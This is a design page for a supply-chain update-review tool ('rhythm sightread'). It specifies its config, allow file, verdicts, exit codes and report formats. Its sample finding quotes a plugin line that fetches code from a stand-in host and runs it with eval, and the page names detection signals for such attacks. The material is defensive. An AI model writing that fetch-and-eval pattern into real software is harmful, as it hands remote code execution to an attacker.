# Output lane: what users see

This page records what the output lane (packages `policy`, `score` and
`report`) shows a user: config keys, the allow file, baselines, verdicts,
exit codes, every output format and signed reports. Texts in code blocks
are exact; tests assert them. `rhythm sightread` below is the program
name as kit `cli.Name()` gives it (`rhythm-sightread` when run directly).

## Config: `.sightread/config.yaml`

Found in the start folder or the nearest parent. The search stops after
the folder that holds `.git` or at the filesystem root. `--config <file>`
reads exactly that file; `--no-config` reads none. Flags win over the
file. Every value is optional: a key left out never overrides a default.

| Key | Default (from the flag) | Checked |
|---|---|---|
| `fail_on` | `none` | none, info, low, medium, high or critical (any case) |
| `min_confidence` | `likely` | confirmed or likely |
| `min_age` | `72h` | a duration such as `3d`, `1w` or `36h` |
| `ecosystems` | all four | wp-plugin, wp-theme, composer, npm (`plugin` and `theme` accepted) |
| `path` | `.` | |
| `transitive`, `pre`, `svn_check` | false | |
| `osv` | true | |
| `sources.*` | the public registries | https://, or http:// on a loopback host; no user name or password |
| `sources.npm.scopes` | none | keys are `@scope` |
| `local_files` | none | `<name glob>: <path with {version}>` |
| `allow_file` | `.sightread/allowed.yaml` | relative to the project folder |
| `allow_from` | none | each path non-empty |
| `trusted_keys` | none | `ed25519:<base64 of a 32-byte key>` |
| `signals.severity` | catalogue severities | a catalogue ID and info to critical; unignorable IDs stay critical |
| `signals.domains_ok` | none | host globs |
| `ignore` | none | `id` and `reason` required; `package` and `path` globs; `until` a date |
| `soundcheck.*` | none | production entries are site URLs |

Every error is E12 (exit 2) and reads
`rhythm sightread: .sightread/config.yaml: <what>`. Examples:

```text
rhythm sightread: .sightread/config.yaml: unknown key fial_on (did you mean fail_on?)
rhythm sightread: .sightread/config.yaml: fail_on "severe": want none, info, low, medium, high or critical
rhythm sightread: .sightread/config.yaml: ignore 1 (integrity-mismatch): integrity-mismatch can't be ignored; it says the bytes are not the ones published or reviewed
rhythm sightread: .sightread/config.yaml: trusted_keys 1: "abc" is not a key such as ed25519:<base64>; rhythm sightread verify-report prints a report's key
```

YAML aliases are capped (10,000 values per alias, 100,000 in all), nesting
at 64 levels and the file at 1 MiB. An ignore entry past its `until` day
stops hiding findings and says so on stderr:

```text
rhythm sightread: .sightread/config.yaml: ignore 1 (license-change) expired 2026-10-25 and no longer hides anything
```

## Allow file: `.sightread/allowed.yaml`

```yaml
# Versions someone reviewed. An entry matches only this exact archive (sha256).
# rhythm sightread allow writes this file; protect it with CODEOWNERS.
allowed:
  - package: npm:sharp
    version: 0.33.5
    sha256: 0b7e...                # all 64 hex in the file
    hash: archive                  # or manifest (WordPress.org)
    signals: [npm-install-script-new]
    reason: prebuilt binary download, known install script
    by: Rhythm Shahriar
    date: "2026-10-22"
    until: "2027-01-31"
```

- An entry matches the same package, version and sha256 while `until`
  has not passed. `signals` limits it to those IDs; absent means all.
- The same version with another sha256 adds the critical finding
  `approved-version-changed` with evidence such as
  `allowed on 2026-10-20 by Ann Reviewer with sha256 bbbbbbbbbbbb; now aaaaaaaaaaaa`.
- Unignorable signals (`integrity-mismatch`, `version-republished`,
  `approved-version-changed`, `known-malicious`, `archive-path-escape`)
  can't be allowed.
- `rhythm sightread allow` keeps entries sorted, writes through a temp
  file and a lock (`<file>.lock`, 15 seconds) and refuses duplicates.
- Pull request rule (`changes`): an entry counts only when the base ref
  holds the same entry (package, version, sha256, hash, signals and
  until). One the change adds is shown and not counted:
  `npm:sharp@1.1.0: allowed in this change, not counted (--trust-pr-allow counts it)`.

Entry errors are E12, for example:

```text
rhythm sightread: .sightread/allowed.yaml: entry 3 (npm:left-pad@1.4.0) needs a reason, so the next person knows why it is allowed
```

## Baseline

`--baseline <report.json>` reads the fingerprints of a saved review.
Findings with those fingerprints are set aside (`baselined: true`) and
don't count; unignorable signals are never baselined. A file that is not
a review report is E12 with the hint
`--baseline takes the JSON a review wrote, such as -o sightread.json`.

## Verdicts and context rules

| Verdict | When |
|---|---|
| `HOLD` | a counted critical finding |
| `REVIEW` | a counted high or medium finding |
| `ROUTINE` | only low or info findings count, or none |
| `ALLOWED` | nothing counts and at least one finding is allowed |
| `UNVERIFIED` | a side is `verified: none` |

The context rules change a finding's severity and say why:

- Owner change: some signals go up one level, `raised_by: ["owner-change"]`
  (terminal `raised by owner-change`, Markdown `(raised by owner-change)`).
- Vendored code (tests, docs, examples, node_modules, vendor in WordPress
  packages, obfuscation in `*.min.js`): one level down,
  `demoted: "vendored path"` (Markdown `(demoted: vendored path)`).

## Exit codes

| Exit | When | Example reason |
|---|---|---|
| 0 | nothing at or above `--fail-on`, or no `--fail-on` | |
| 1 | counted findings at or above `--fail-on` | `2 findings at or above --fail-on high` |
| 1 | watch: new findings at or above `--fail-on-new` | `1 new finding at or above --fail-on-new medium` |
| 3 | gaps under `--fail-on` | `1 update couldn't be verified, 2 packages weren't checked and the run hit its --deadline, so --fail-on high can't pass it` |

The hint under a gap names the flag that accepts it:
`add --allow-unverified to accept them`, `add --allow-partial to accept them`
or both. Findings win over gaps (exit 1).

## Terminal (default on a terminal)

```text
  ♪ rhythm sightread 1.0.0  wp-plugin countdown-timer-ultimate  2.6.7 → 2.6.8
  ────────────────────────────────────────────────────────────────────────
  Read-only. Sightread changes nothing on your site and never runs the
  code it downloads.

  ▸ Installed     2.6.7 in wp-content/plugins/countdown-timer-ultimate ·
                  matches wordpress.org ✓
  ▸ Candidate     2.6.8 · released 2026-10-24 · latest
  ▸ Integrity     both versions: every file matches wordpress.org
                  checksums (SHA-256) ✓
  ▸ Publisher     unchanged (sampleauthor)
  ▸ Diff          14 files changed, 1 added · +2,184 −12 lines · 412 KB →
                  431 KB
  ▸ Changelog     2.6.8: "Check compatibility with WordPress 6.8"

  CRITICAL  1 ────────────────────────────────────────────────────────────

 ▌  CRITICAL   Fetches remote code and runs it
 ▌             includes/class-wpos-analytics.php:88
 ▌             wp_remote_get('https://analytics.wpos-cdn.example/v2/p') →
 ▌             eval($body)
 ▌             → Hold the update. Nothing in the changelog explains this.

 ╭──────────────────────────────────────────────────────────────────────╮
 │  VERDICT                                                       HOLD  │
 │  ■ 1 critical                                                        │
 │  Sightread reports what changed. It does not judge intent.           │
 ╰──────────────────────────────────────────────────────────────────────╯
  1 update reviewed · 2 archives verified · 0 from cache · 1.4s

  → the full diff:
    rhythm sightread plugin countdown-timer-ultimate -o review.html --open
  → explain a finding: rhythm sightread explain remote-fetch-exec
  → record a review:
    rhythm sightread allow wp-plugin:countdown-timer-ultimate@2.6.8 --reason "..."
```

- With `--soundcheck` the second line reads
  `Read-only here. --soundcheck installs the update on the staging copy, where its code runs.`
- A clean update's box reads
  `No risk signals found. This is a static diff, not proof the update is safe.`
- Several updates: a table first (`VERDICT  UPDATE  FROM  TO  FINDINGS`,
  worst first; over 10 ROUTINE rows become `N updates with no risk signals`),
  a section per HOLD and REVIEW, then `UNVERIFIED` and `NOT CHECKED`
  lists. The box reads `6 UPDATES` and `1 hold · 1 review · 2 routine`.
- Fleet runs print rows such as `wpforms-lite 1.9.1 → 1.9.2  REVIEW on 14 sites`.
- Past `--max-findings` (default 10): `… 9 more (see -o review.html)`.
- `--diff` adds a `DIFF` section with every hunk.
- Report notes (such as `--skip-roadie-verify was used`) print as `!`
  lines under the header; warnings as `!` lines under the footer.
- Next steps include the update command Sightread never runs:
  `wp plugin update a b`, `composer update vendor/pkg` or `npm install pkg@1.2.3`.
- `--plain` (and any output that is not a terminal) drops colour, glyphs
  and the box: `[CRITICAL] Fetches remote code and runs it - includes/class-wpos-analytics.php:88`.
- `-q` prints the table and the findings only.
- Package text shows control characters and bidi controls escaped
  (`\x1b`, `‮`) and masks secrets.

## explain

```text
remote-fetch-exec: Fetches remote code and runs it
  Severity:    critical
  Confidence:  confirmed
  Ecosystems:  wp-plugin, wp-theme, composer, npm

Why it matters
  ...
How to review
  1. ...
False alarms
Incidents
More
  https://github.com/RhythmShahriar/rhythm/wiki/Sightread-Signal-Reference#remote-fetch-exec
```

- `explain <report.json> <n|fingerprint>` starts with
  `Finding 7 of 54: remote-fetch-exec: Fetches remote code and runs it`,
  then Update, Severity (with `(raised by ...)` or `(demoted: ...)`),
  Confidence, Where, Domains, Fingerprint, Counted, Evidence, Advice and
  Diff. Findings are numbered from 1 in report order.
- Without the cached archives the Diff section reads
  `archive not in cache: run the review again (it is cached for 30 days)`.
- An unknown ID is E13 (exit 2):
  `rhythm sightread explain: no signal "evil" (did you mean eval-dynamic?)`.
- `--json` writes kind `explain`; `complete` is false when explain text
  or the hunks are missing.

## JSON and JSONL

Envelope fields in order: `schema` (`rhythm-sightread/v1`), `kind`,
`tool`, `version`, `complete`, `summary` (every count always present),
`verdict` (`ok`, `findings` or `error`), `data`. Lists are `[]`, never
`null`. JSONL writes one `{"kind":"update", ...}` line per update, then
the envelope without `data.updates`. The schema ships as
`docs/schema/rhythm-sightread-v1.json`.

```json
{"schema": "rhythm-sightread/v1", "kind": "review", "tool": "rhythm-sightread", "version": "1.0.0",
 "complete": true, "summary": {"updates": 1, "hold": 1, "critical": 1}, "verdict": "findings",
 "data": {"updates": [{"ecosystem": "wp-plugin", "name": "countdown-timer-ultimate", "verdict": "hold"}]}}
```

## SARIF 2.1.0

One rule per signal with `helpUri`; levels error (critical, high),
warning (medium) and note (low, info); `security-severity` 9.5, 8.0, 5.5,
3.0 and 0.0; `partialFingerprints` key `sightreadFinding/v1`.

The location rule: a Composer or npm finding points at the lockfile line
of the package; a WordPress plugin or theme in a git repository points at
its main file; anything else points at the target folder (`.`). The path
inside the package is in the message and in `properties.package_path`.

```json
{"ruleId": "remote-fetch-exec", "level": "error",
 "message": {"text": "countdown-timer-ultimate 2.6.7 → 2.6.8: Fetches remote code and runs it (includes/class-wpos-analytics.php:88). Verdict HOLD."},
 "partialFingerprints": {"sightreadFinding/v1": "9f3c1a2e7d41b0c5"}}
```

## Markdown (`--md`)

```markdown
## Sightread: 1 to hold

| Verdict | Update | From | To | Findings |
|---|---|---|---|---|
| 🛑 HOLD | countdown-timer-ultimate (wp-plugin) | 2.6.7 | 2.6.8 | 1 critical |

Record your review: `rhythm sightread allow wp-plugin:countdown-timer-ultimate@2.6.8 --reason "..."`

---

Static diff of official releases; Sightread never ran this code. Not proof an update is safe.
```

Defanging: inside code spans and the diff block `https://` becomes
`hxxps://` and the last dot of a host name becomes `[.]`
(`analytics.wpos-cdn[.]example`), unless the last label is a file
extension such as `php`. All other package text goes through
`term.EscapeMarkdown`, so mentions, links, images and HTML render as
text. The report stays under 60,000 characters, trimming hunks first, with
`> trimmed: see the HTML report`.

## HTML (`--html`)

One file built with `html/template`, inline CSS and one inline script.
The CSP meta tag:

```text
default-src 'none'; style-src 'unsafe-inline'; img-src data:; script-src 'sha256-<hash of the one inline script>'
```

Nothing from a package becomes markup, a link or an attribute; the only
links are `#u<n>` anchors inside the page.

## Signed reports (`--sign`, `verify-report`)

`--sign` writes `<report>.json.sig` next to the JSON:

```json
{
  "key": "ed25519:<base64 public key>",
  "sig": "<base64 Ed25519 signature over the exact JSON file bytes>",
  "sha256": "<hex SHA-256 of the JSON file bytes>"
}
```

- The key is made on first use at `<config dir>/sightread/report-key`
  (PEM PKCS #8, mode 0600) with its public key beside it as
  `report-key.pub` (PEM).
- The Markdown and HTML footers carry
  `Signed JSON report sha256: <hex>`, the same hash as the `.sig` file,
  so they can be matched to the signed JSON.
- Verification fails when the JSON changed after signing
  (`the report changed after it was signed (sha256 <12 hex> now, <12 hex> when signed)`),
  when the signature does not match
  (`the signature does not match the report and key ed25519:...`) or when
  the key is not trusted
  (`the report was signed by a key that is not trusted (ed25519:...); add it to trusted_keys if you trust it`).
- A signed report proves it was not changed after signing and which key
  signed it. A local key proves only "this machine".
